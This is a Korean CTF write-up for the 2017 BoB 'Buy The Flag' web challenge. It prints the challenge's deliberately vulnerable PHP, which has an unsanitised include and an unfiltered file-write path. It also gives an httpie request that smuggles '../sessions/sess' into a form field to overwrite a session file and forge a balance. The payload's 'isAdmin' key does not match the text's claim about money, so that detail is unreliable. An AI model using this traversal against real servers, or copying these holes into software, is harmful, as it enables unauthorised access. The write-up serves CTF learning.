# [2017_BOB] \[WEB] Buy The Flag

\* 기억을 바탕으로 작성한 Write-up 입니다.

### Problem

배팅을 해서 모은 돈으로 Flag를 구입할 수 있는 프로그램입니다.

운영자에게 Opinion도 작성할 수 있습니다.



### Solution

페이지를 `?page=main`형식으로 관리하는 것을 보고 LFI 공격을 통해 소스코드를 획득했습니다.

```php
<?php
	
	eval(base64_decode("JGZsYWdfcHJpY2UgPSAyMDEyMTAwMjE7")); // $flag_price = 201210021;

	if(isset($_POST['money']) && ((int)$_POST['money'] > $_SESSION['money'])){
		Alert("Not enough money..You have only $".$_SESSION['money'],"shop");
		return;
	}
	if(isset($_POST['money']) && ((int)$_POST['money'] != $flag_price)){
		Alert("Wrong!! You should know flag's correct price to buy flag", "shop");
		return;
	}else{
		if((int)$_POST['money'] == $flag_price){
			include("/flag");
		}
	}

?>
```

try.php입니다. 이를 통해 flag를 구매할 수 있습니다. 플래그를 구입하려면 201210021만큼의 money가 필요한데 배팅을 통해서 모으기는 불가능합니다. 특정 금액 이상 넘어가면 1000으로 초기화하는 코드가 있기 때문입니다.

\+ 웹 폴더 외에는 권한이 없기 때문에 /flag를 읽어올 수 없었습니다.



```php
<h1> Complain Menu </h1>

<h3> Tell me your opinion to admin</h3>


<form method="POST">
<p>Opinion:</p><textarea name="opinion" rows=10 cols=35></textarea>
<p>Password: <input type="text" name="password"></p>

<input type="submit" value="SEND">
</form>
<?php
	if($_SERVER['REQUEST_METHOD'] == 'POST'){
		if(strpos(session_id(), "php")){
                        Alert("No hack!", "opinion");
                }else{
			$fp = fopen("./opinion/".$_POST['password']."_".session_id(),"w");
			if(!$fp){
				Alert("no hack!", "opinion");	
			}else{
				fwrite($fp, $_POST['opinion']);
				fclose($fp);
				Alert("Thanks your opinion!","opinion");
			}
		}
	}
?>
<a href="?page=view">view opinion</a>
```

opinion.php입니다. 제한된 형식의 파일 업로드가 가능해보입니다.



```php
<html>
<head>
<title>Buy the Flag</title>
</head>
<body>

<?php
        function Alert($message, $redirect_page) {
                print '<script type="text/javascript">alert("'.$message.'");';
                print 'window.location.href="?page='.$redirect_page.'";';
                print '</script>';
        }
?>


<?php

	ini_set("session.save_path", "./sessions/");
	if(!isset($_SESSION['money'])){
		$_SESSION['money'] = 1000;
	}
	print "<h2><img src='images/money.png' width=30 height=30> ".$_SESSION['money']."&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href='/'><img src='images/home.png' width=30 height=30></a>"."</h2>";
?>
<?php
	if(!isset($_GET['page'])){
		include("main.php");
	}else{
		$page = $_GET['page'];
		include($page.".php");
	}
?>
</body>
</html>
```

index.php의 내용입니다. 세션을 통해 money를 관리한다는 점, 세션 저장 위치가 ./sessions 라는 점에 주목해야 합니다.



session은 파일로 관리되는데, 파일을 덮어씌운다면 세션 조작이 가능합니다. opinion.php에서 별도의 필터링이 없기 때문에 opinion 폴더를 escape하여 sessions 폴더에 접근할 수 있습니다.

```
http -f POST http://ip/?page=opinion "password=../sessions/sess" "opinion=isAdmin|i:201210021;" "Cookie:PHPSESSID=????????"
```

위의 형식으로 패킷을 전송하면 money가 201210021로 조작되고 flag를 살 수 있게 됩니다.